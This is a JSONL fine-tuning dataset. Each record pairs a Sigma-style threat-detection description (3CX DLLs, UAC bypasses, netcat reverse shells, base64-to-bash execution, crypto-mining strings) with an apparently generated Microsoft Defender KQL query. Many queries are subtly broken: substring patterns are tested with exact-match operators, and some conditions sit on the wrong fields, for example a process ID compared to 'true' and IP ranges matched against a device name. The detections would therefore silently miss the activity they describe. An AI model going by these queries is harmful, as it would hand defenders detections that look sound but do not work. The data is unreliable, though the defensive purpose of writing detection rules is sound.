{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects DLL load activity of known compromised DLLs used in by the compromised 3CXDesktopApp Topic: image_load_malware_3cx_compromise_susp_dll"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where (SHA256 startswith \"7986BBAEE8940DA11CE089383521AB420C443AB7B15ED42AED91FD31CE833896\" or SHA256 startswith \"11BE1803E2E307B647A8A7E02D128335C448FF741BF06BF52B332E0BBF423B03\" or SHA256 startswith \"F79C3B0ADB6EC7BCC8BC9AE955A1571AAED6755A28C8B17B1D7595EE86840952\" or SHA256 startswith \"8AB3A5EAAF8C296080FADF56B265194681D7DA5DA7C02562953A4CB60E147423\") or (SHA1 startswith \"BF939C9C261D27EE7BB92325CC588624FCA75429\" or SHA1 startswith \"20D554A80D759C50D6537DD7097FED84DD258B3E\" or SHA1 startswith \"894E7D4FFD764BB458809C7F0643694B036EAD30\" or SHA1 startswith \"3B3E778B647371262120A523EB873C20BB82BEAF\") or (MD5 startswith \"74BC2D0B6680FAA1A5A76B27E5479CBC\" or MD5 startswith \"82187AD3F0C6C225E2FBA0C867280CC9\" or MD5 startswith \"11BC82A9BD8297BD0823BCE5D6202082\" or MD5 startswith \"7FAEA2B01796B80D180399040BB69835\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the usage of tsclient share to place a backdoor on the RDP source machines startup folder Topic: file_event_win_tsclient_filewrite_startup"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \"\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\\" and InitiatingProcessFolderPath =~ \"\\\\mstsc.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects modifications to the Windows Defender exclusion registry key. This could indicate a potentially suspicious or even malicious activity by an attacker trying to add a new exclusion in order to bypass security.\n Topic: win_security_windows_defender_exclusions_registry_modified"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey endswith \"\\\\Microsoft\\\\Windows Defender\\\\Exclusions*\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects DLL sideloading of unsigned \"mfdetours.dll\". Executing \"mftrace.exe\" can be abused to attach to an arbitrary process and force load any DLL named \"mfdetours.dll\" from the current directory of execution. Topic: image_load_side_load_mfdetours_unsigned"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where FolderPath endswith \"\\\\mfdetours.dll\" and (not((FolderPath contains \":\\\\Program Files (x86)\\\\Windows Kits\\\\10\\\\bin\\\\\" and InitiatingProcessVersionInfoCompanyName =~ \"Valid\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects changes to Internet Explorers (IE / Windows Internet properties) ZoneMap configuration of the \"HTTP\" and \"HTTPS\" protocols to point to the \"My Computer\" zone. This allows downloaded files from the Internet to be granted the same level of trust as files stored locally.\n Topic: registry_set_ie_security_zone_protocol_defaults_downgrade"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey contains \"\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\\\\ZoneMap\\\\ProtocolDefaults\" and (RegistryKey endswith \"\\\\http\" or RegistryKey endswith \"\\\\https\") and RegistryValueData contains \"DWORD (0x00000000)\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects setting proxy configuration Topic: proc_creation_lnx_proxy_connection"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"http_proxy=\", \"https_proxy=\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of a new office macro files on the systems Topic: file_event_win_office_macro_files_created"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName in~ (\".docm\", \".dotm\", \".xlsm\", \".xltm\", \".potm\", \".pptm\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects specific process parameters as used by ACTINIUM scheduled task persistence creation. Topic: proc_creation_win_apt_actinium_persistence"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"schtasks\", \"create\", \"wscript\", \" /e:vbscript\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of \"curl.exe\" with the \"file://\" protocol handler in order to read local files. Topic: proc_creation_win_curl_local_file_read"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"file:///\" and (FolderPath endswith \"\\\\curl.exe\" or ProcessVersionInfoOriginalFileName =~ \"curl.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of a child \"explorer.exe\" process from a shell like process such as \"cmd.exe\" or \"powershell.exe\".\nAttackers can use \"explorer.exe\" for evading defense mechanisms by proxying the execution through the latter.\nWhile this is often a legitimate action, this rule can be use to hunt for anomalies.\nMuddy Waters threat actor was seeing using this technique.\n Topic: proc_creation_win_explorer_child_of_shell_process"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (InitiatingProcessFileName in~ (\"\\\\cmd.exe\", \"\\\\powershell.exe\", \"\\\\pwsh.exe\")) and ProcessCommandLine =~ \"explorer.exe\" and InitiatingProcessFolderPath =~ \"\\\\explorer.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of \"wmic\" with the \"group\" flag.\nAdversaries may attempt to find local system groups and permission settings.\nThe knowledge of local system permission groups can help adversaries determine which groups exist and which users belong to a particular group.\nAdversaries may use this information to determine which users have elevated permissions, such as the users found within the local administrators group.\n Topic: proc_creation_win_wmic_recon_group"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \" group\" and (FolderPath endswith \"\\\\wmic.exe\" or ProcessVersionInfoOriginalFileName =~ \"wmic.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "ForceV1 asks for information directly from the kernel space. Conhost connects to the console application. High IntegrityLevel means the process is running with elevated privileges, such as an Administrator context. Topic: proc_creation_win_conhost_legacy_option"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (InitiatingProcessIntegrityLevel in~ (\"High\", \"S-1-16-12288\")) and (ProcessCommandLine in~ (\"conhost.exe\", \"0xffffffff\", \"-ForceV1\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the pattern of UAC Bypass using NTFS reparse point and wusa.exe DLL hijacking (UACMe 36) Topic: file_event_win_uac_bypass_ntfs_reparse_point"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \"\\\\AppData\\\\Local\\\\Temp\\\\api-ms-win-core-kernel32-legacy-l1.DLL\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a non-browser process interacting with the Google API which could indicate the use of a covert C2 such as Google Sheet C2 (GC2-sheet)\n Topic: net_connection_win_domain_google_api_non_browser_access"}, {"role": "assistant", "content": "DeviceNetworkEvents\n| where (RemoteUrl in~ (\"drive.googleapis.com\", \"oauth2.googleapis.com\", \"sheets.googleapis.com\", \"www.googleapis.com\")) and (not((InitiatingProcessFolderPath =~ \"\" or isnull(InitiatingProcessFolderPath)))) and (not((InitiatingProcessFolderPath =~ \"\\\\brave.exe\" or (InitiatingProcessFolderPath in~ (\":\\\\Program Files\\\\Google\\\\Chrome\\\\Application\\\\chrome.exe\", \":\\\\Program Files (x86)\\\\Google\\\\Chrome\\\\Application\\\\chrome.exe\")) or (InitiatingProcessFolderPath contains \":\\\\Program Files (x86)\\\\Microsoft\\\\EdgeWebView\\\\Application\\\\\" or (InitiatingProcessFolderPath endswith \":\\\\Program Files (x86)\\\\Microsoft\\\\Edge\\\\Application\\\\msedge.exe\" or InitiatingProcessFolderPath endswith \":\\\\Program Files\\\\Microsoft\\\\Edge\\\\Application\\\\msedge.exe\" or InitiatingProcessFolderPath endswith \"\\\\WindowsApps\\\\MicrosoftEdge.exe\")) or ((InitiatingProcessFolderPath contains \":\\\\Program Files (x86)\\\\Microsoft\\\\EdgeCore\\\\\" or InitiatingProcessFolderPath contains \":\\\\Program Files\\\\Microsoft\\\\EdgeCore\\\\\") and (InitiatingProcessFolderPath in~ (\"\\\\msedge.exe\", \"\\\\msedgewebview2.exe\"))) or (InitiatingProcessFolderPath in~ (\":\\\\Program Files\\\\Mozilla Firefox\\\\firefox.exe\", \":\\\\Program Files (x86)\\\\Mozilla Firefox\\\\firefox.exe\")) or (InitiatingProcessFolderPath has_all (\"\\\\GoogleDriveFS.exe\") and InitiatingProcessFolderPath contains \":\\\\Program Files\\\\Google\\\\Drive File Stream\\\\\") or InitiatingProcessFolderPath =~ \"\\\\GoogleUpdate.exe\" or (InitiatingProcessFolderPath in~ (\":\\\\Program Files (x86)\\\\Internet Explorer\\\\iexplore.exe\", \":\\\\Program Files\\\\Internet Explorer\\\\iexplore.exe\")) or InitiatingProcessFolderPath =~ \"\\\\maxthon.exe\" or InitiatingProcessFolderPath =~ \"\\\\opera.exe\" or InitiatingProcessFolderPath =~ \"\\\\outlook.exe\" or InitiatingProcessFolderPath =~ \"\\\\safari.exe\" or InitiatingProcessFolderPath =~ \"\\\\seamonkey.exe\" or InitiatingProcessFolderPath =~ \"\\\\vivaldi.exe\" or InitiatingProcessFolderPath =~ \"\\\\whale.exe\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects script file execution (.js, .jse, .vba, .vbe, .vbs, .wsf) by Wscript/Cscript Topic: proc_creation_win_wscript_cscript_script_exec"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\".js\", \".jse\", \".vba\", \".vbe\", \".vbs\", \".wsf\")) and ((ProcessVersionInfoOriginalFileName in~ (\"wscript.exe\", \"cscript.exe\")) or (FolderPath endswith \"\\\\wscript.exe\" or FolderPath endswith \"\\\\cscript.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects MMC20.Application Lateral Movement; specifically looks for the spawning of the parent MMC.exe with a command line of \"-Embedding\" as a child of svchost.exe Topic: proc_creation_win_mmc_mmc20_lateral_movement"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"\\\\svchost.exe\" and ProcessCommandLine =~ \"-Embedding\" and InitiatingProcessFolderPath =~ \"\\\\mmc.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects LockerGoga ransomware activity via specific command line. Topic: proc_creation_win_malware_lockergoga_ransomware"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"-i SM-tgytutrc -s\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects setting a custom URL for OneDriveStandaloneUpdater.exe to download a file from the Internet without executing any\nanomalous executables with suspicious arguments. The downloaded file will be in C:\\Users\\redacted\\AppData\\Local\\Microsoft\\OneDrive\\StandaloneUpdaterreSignInSettingsConfig.json\n Topic: registry_set_lolbin_onedrivestandaloneupdater"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey contains \"\\\\SOFTWARE\\\\Microsoft\\\\OneDrive\\\\UpdateOfficeConfig\\\\UpdateRingSettingURLFromOC\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the stopping of a Windows service via the PowerShell Cmdlet \"Stop-Service\" Topic: proc_creation_win_powershell_stop_service"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"Stop-Service \" and ((ProcessVersionInfoOriginalFileName in~ (\"PowerShell.EXE\", \"pwsh.dll\")) or (FolderPath endswith \"\\\\powershell.exe\" or FolderPath endswith \"\\\\pwsh.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects an executable in the users directory started from one of the Microsoft Office suite applications (Word, Excel, PowerPoint, Publisher, Visio) Topic: proc_creation_win_office_spawn_exe_from_users_directory"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((InitiatingProcessFileName in~ (\"\\\\WINWORD.EXE\", \"\\\\EXCEL.EXE\", \"\\\\POWERPNT.exe\", \"\\\\MSPUB.exe\", \"\\\\VISIO.exe\", \"\\\\MSACCESS.exe\", \"\\\\EQNEDT32.exe\")) and InitiatingProcessFolderPath =~ \".exe\") and (not(InitiatingProcessFolderPath =~ \"\\\\Teams.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detect changes to the \"PendingFileRenameOperations\" registry key from uncommon or suspicious images locations to stage currently used files for rename or deletion after reboot.\n Topic: registry_set_susp_pendingfilerenameoperations"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where (ActionType =~ \"RegistryValueSet\" and RegistryKey contains \"\\\\CurrentControlSet\\\\Control\\\\Session Manager\\\\PendingFileRenameOperations\") and ((InitiatingProcessFolderPath in~ (\"\\\\reg.exe\", \"\\\\regedit.exe\")) or (InitiatingProcessFolderPath contains \"\\\\AppData\\\\Local\\\\Temp\\\\\" or InitiatingProcessFolderPath contains \"\\\\Users\\\\Public\\\\\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential DLL sideloading of \"appverifUI.dll\" Topic: image_load_side_load_appverifui"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where FolderPath endswith \"\\\\appverifUI.dll\" and (not(((InitiatingProcessFolderPath in~ (\"C:\\\\Windows\\\\SysWOW64\\\\appverif.exe\", \"C:\\\\Windows\\\\System32\\\\appverif.exe\")) and (FolderPath startswith \"C:\\\\Windows\\\\System32\\\\\" or FolderPath startswith \"C:\\\\Windows\\\\SysWOW64\\\\\" or FolderPath startswith \"C:\\\\Windows\\\\WinSxS\\\\\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects network connections to Cloudflared tunnels domains initiated by a process on the system.\nAttackers can abuse that feature to establish a reverse shell or persistence on a machine.\n Topic: net_connection_win_domain_cloudflared_communication"}, {"role": "assistant", "content": "DeviceNetworkEvents\n| where InitiatingProcessId =~ \"true\" and (RemoteUrl in~ (\".v2.argotunnel.com\", \"protocol-v2.argotunnel.com\", \"trycloudflare.com\", \"update.argotunnel.com\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a suspicious DLL load by an \"svchost\" process based on location and name that might be related to ColdSteel RAT. This DLL location and name has been seen used by ColdSteel as the service DLL for its persistence mechanism\n Topic: image_load_malware_coldsteel_persistence_service_dll"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where FolderPath endswith \"\\\\AppData\\\\Roaming\\\\newdev.dll\" and InitiatingProcessFolderPath =~ \"\\\\svchost.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Monitors for the hiding possible malicious files in the C:\\Windows\\Fonts\\ location. This folder doesnt require admin privillege to be written and executed from. Topic: proc_creation_win_susp_hiding_malware_in_fonts_folder"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"echo\", \"copy\", \"type\", \"file createnew\", \"cacls\")) and ProcessCommandLine =~ \"C:\\\\Windows\\\\Fonts\\\\\" and (ProcessCommandLine in~ (\".sh\", \".exe\", \".dll\", \".bin\", \".bat\", \".cmd\", \".js\", \".msh\", \".reg\", \".scr\", \".ps\", \".vb\", \".jar\", \".pl\", \".inf\", \".cpl\", \".hta\", \".msi\", \".vbs\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects usage of \"msedge_proxy.exe\" to download arbitrary files Topic: proc_creation_win_msedge_proxy_download"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"http://\", \"https://\")) and (FolderPath endswith \"\\\\msedge_proxy.exe\" or ProcessVersionInfoOriginalFileName =~ \"msedge_proxy.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects registry set activity of a value called \"Seed\" stored in the \"\\Cryptography\\Providers\\\" registry key.\nThe Kapeka backdoor leverages this location to register a new SIP provider for backdoor configuration persistence.\n Topic: registry_set_malware_kapeka_backdoor_configuration"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where (RegistryKey contains \"\\\\SOFTWARE\\\\Microsoft\\\\Cryptography\\\\Providers\\\\{\" and RegistryKey endswith \"\\\\Seed\") and (not(RegistryValueData contains \"(Empty)\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the use of 3proxy, a tiny free proxy server Topic: proc_creation_win_pua_3proxy_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFolderPath =~ \"\\\\3proxy.exe\" or ProcessCommandLine =~ \".exe -i127.0.0.1 -p\" or ProcessVersionInfoFileDescription =~ \"3proxy - tiny proxy server\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious process command line that uses base64 encoded input for execution with a shell Topic: proc_creation_lnx_base64_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"base64 \" and ((ProcessCommandLine contains \"| bash \" or ProcessCommandLine contains \"| sh \" or ProcessCommandLine contains \"|bash \" or ProcessCommandLine contains \"|sh \") or (ProcessCommandLine endswith \" |sh\" or ProcessCommandLine endswith \"| bash\" or ProcessCommandLine endswith \"| sh\" or ProcessCommandLine endswith \"|bash\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the pattern of UAC Bypass using Windows Media Player osksupport.dll (UACMe 32) Topic: file_event_win_uac_bypass_wmp"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \"\\\\AppData\\\\Local\\\\Temp\\\\OskSupport.dll\" or (FileName =~ \"C:\\\\Program Files\\\\Windows Media Player\\\\osk.exe\" and InitiatingProcessFolderPath =~ \"C:\\\\Windows\\\\system32\\\\DllHost.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects changes to the default RDP port.\nRemote desktop is a common feature in operating systems. It allows a user to log into a remote system using an interactive session with a graphical user interface.\nMicrosoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS).\n Topic: registry_set_change_rdp_port"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey endswith \"\\\\Control\\\\Terminal Server\\\\WinStations\\\\RDP-Tcp\\\\PortNumber\" and (not(RegistryValueData =~ \"DWORD (0x00000d3d)\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects programs that connect to known malware callback ports based on threat intelligence reports.\n Topic: net_connection_lnx_susp_malware_callback_port"}, {"role": "assistant", "content": "DeviceNetworkEvents\n| where (InitiatingProcessId =~ \"true\" and (RemotePort in~ (\"888\", \"999\", \"2200\", \"2222\", \"4000\", \"4444\", \"6789\", \"8531\", \"50501\", \"51820\"))) and (not((InitiatingProcessRemoteSessionDeviceName in~ (\"127.0.0.0/8\", \"10.0.0.0/8\", \"172.16.0.0/12\", \"192.168.0.0/16\", \"169.254.0.0/16\", \"::1/128\", \"fe80::/10\", \"fc00::/7\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution traces of the WizardUpdate malware. WizardUpdate is a macOS trojan that attempts to infiltrate macOS machines to steal data and it is associated with other types of malicious payloads, increasing the chances of multiple infections on a device. Topic: proc_creation_macos_wizardupdate_malware_infection"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessCommandLine in~ (\"=$(curl \", \"eval\")) and InitiatingProcessFolderPath =~ \"/sh\") or (ProcessCommandLine =~ \"_intermediate_agent_\" and InitiatingProcessFolderPath =~ \"/curl\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects command line parameters or strings often used by crypto miners Topic: proc_creation_lnx_crypto_mining"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\" --cpu-priority=\", \"--donate-level=0\", \" -o pool.\", \" --nicehash\", \" --algo=rx/0 \", \"stratum+tcp://\", \"stratum+udp://\", \"sh -c /sbin/modprobe msr allow_writes=on\", \"LS1kb25hdGUtbGV2ZWw9\", \"0tZG9uYXRlLWxldmVsP\", \"tLWRvbmF0ZS1sZXZlbD\", \"c3RyYXR1bSt0Y3A6Ly\", \"N0cmF0dW0rdGNwOi8v\", \"zdHJhdHVtK3RjcDovL\", \"c3RyYXR1bSt1ZHA6Ly\", \"N0cmF0dW0rdWRwOi8v\", \"zdHJhdHVtK3VkcDovL\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of the Ammy Admin RMM agent for remote management. Topic: proc_creation_win_remote_access_tools_ammyy_admin_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"AMMYY\\\\aa_nts.dll\\\",run\" and InitiatingProcessFolderPath =~ \"\\\\rundll32.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of Windows Problem Steps Recorder (psr.exe), a utility used to record the user screen and clicks. Topic: proc_creation_win_psr_capture_screenshots"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"/start\", \"-start\")) and InitiatingProcessFolderPath =~ \"\\\\Psr.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of WMIC in order to get a list of firewall and antivirus products Topic: proc_creation_win_wmic_recon_product"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"Product\" and (FolderPath endswith \"\\\\wmic.exe\" or ProcessVersionInfoOriginalFileName =~ \"wmic.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Once executed, colorcpl.exe will copy the arbitrary file to c:\\windows\\system32\\spool\\drivers\\color\\ Topic: file_event_win_susp_colorcpl"}, {"role": "assistant", "content": "DeviceFileEvents\n| where InitiatingProcessFolderPath =~ \"\\\\colorcpl.exe\" and (not((FileName in~ (\".icm\", \".gmmp\", \".cdmp\", \".camp\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects modification of autostart extensibility point (ASEP) in registry. Topic: registry_set_asep_reg_keys_modification_office"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where (RegistryKey contains \"\\\\Software\\\\Wow6432Node\\\\Microsoft\\\\Office\" or RegistryKey contains \"\\\\Software\\\\Microsoft\\\\Office\") and (RegistryKey contains \"\\\\Word\\\\Addins\" or RegistryKey contains \"\\\\PowerPoint\\\\Addins\" or RegistryKey contains \"\\\\Outlook\\\\Addins\" or RegistryKey contains \"\\\\Onenote\\\\Addins\" or RegistryKey contains \"\\\\Excel\\\\Addins\" or RegistryKey contains \"\\\\Access\\\\Addins\" or RegistryKey contains \"test\\\\Special\\\\Perf\") and (not(((InitiatingProcessFolderPath =~ \"C:\\\\Program Files\\\\AVG\\\\Antivirus\\\\RegSvr.exe\" and RegistryKey endswith \"\\\\Microsoft\\\\Office\\\\Outlook\\\\Addins\\\\Antivirus.AsOutExt*\") or RegistryValueData =~ \"(Empty)\" or ((InitiatingProcessFolderPath in~ (\"C:\\\\Program Files\\\\Microsoft Office\\\\\", \"C:\\\\Program Files (x86)\\\\Microsoft Office\\\\\", \"C:\\\\Windows\\\\System32\\\\msiexec.exe\", \"C:\\\\Windows\\\\System32\\\\regsvr32.exe\")) and (RegistryKey endswith \"\\\\Excel\\\\Addins\\\\AdHocReportingExcelClientLib.AdHocReportingExcelClientAddIn.1*\" or RegistryKey endswith \"\\\\Excel\\\\Addins\\\\ExcelPlugInShell.PowerMapConnect*\" or RegistryKey endswith \"\\\\Excel\\\\Addins\\\\NativeShim*\" or RegistryKey endswith \"\\\\Excel\\\\Addins\\\\NativeShim.InquireConnector.1*\" or RegistryKey endswith \"\\\\Excel\\\\Addins\\\\PowerPivotExcelClientAddIn.NativeEntry.1*\" or RegistryKey endswith \"\\\\Outlook\\\\AddIns\\\\AccessAddin.DC*\" or RegistryKey endswith \"\\\\Outlook\\\\AddIns\\\\ColleagueImport.ColleagueImportAddin*\" or RegistryKey endswith \"\\\\Outlook\\\\AddIns\\\\EvernoteCC.EvernoteContactConnector*\" or RegistryKey endswith \"\\\\Outlook\\\\AddIns\\\\EvernoteOLRD.Connect*\" or RegistryKey endswith \"\\\\Outlook\\\\Addins\\\\Microsoft.VbaAddinForOutlook.1*\" or RegistryKey endswith \"\\\\Outlook\\\\Addins\\\\OcOffice.OcForms*\" or RegistryKey contains \"\\\\Outlook\\\\Addins\\\\OneNote.OutlookAddin\" or RegistryKey endswith \"\\\\Outlook\\\\Addins\\\\OscAddin.Connect*\" or RegistryKey endswith \"\\\\Outlook\\\\Addins\\\\OutlookChangeNotifier.Connect*\" or RegistryKey contains \"\\\\Outlook\\\\Addins\\\\UCAddin.LyncAddin.1\" or RegistryKey contains \"\\\\Outlook\\\\Addins\\\\UCAddin.UCAddin.1\" or RegistryKey endswith \"\\\\Outlook\\\\Addins\\\\UmOutlookAddin.FormRegionAddin*\")) or InitiatingProcessFolderPath =~ \"\\\\OfficeClickToRun.exe\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of netcat with the \"-e\" flag followed by common shells. This could be a sign of a potential reverse shell setup. Topic: proc_creation_lnx_netcat_reverse_shell"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\" -c \", \" -e \")) and (InitiatingProcessFolderPath in~ (\"/nc\", \"/ncat\")) and (ProcessCommandLine in~ (\" ash\", \" bash\", \" bsh\", \" csh\", \" ksh\", \" pdksh\", \" sh\", \" tcsh\", \"/bin/ash\", \"/bin/bash\", \"/bin/bsh\", \"/bin/csh\", \"/bin/ksh\", \"/bin/pdksh\", \"/bin/sh\", \"/bin/tcsh\", \"/bin/zsh\", \"$IFSash\", \"$IFSbash\", \"$IFSbsh\", \"$IFScsh\", \"$IFSksh\", \"$IFSpdksh\", \"$IFSsh\", \"$IFStcsh\", \"$IFSzsh\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of files with the \".rdp\" extensions in the temporary directory that Outlook uses when opening attachments.\nThis can be used to detect spear-phishing campaigns that use RDP files as attachments.\n Topic: file_event_win_office_outlook_rdp_file_creation"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \".rdp\" and ((FolderPath contains \"\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Outlook_\" or FolderPath contains \"\\\\AppData\\\\Local\\\\Microsoft\\\\Olk\\\\Attachments\\\\\") or (FolderPath contains \"\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\\" and FolderPath contains \"\\\\Content.Outlook\\\\\"))"}]}
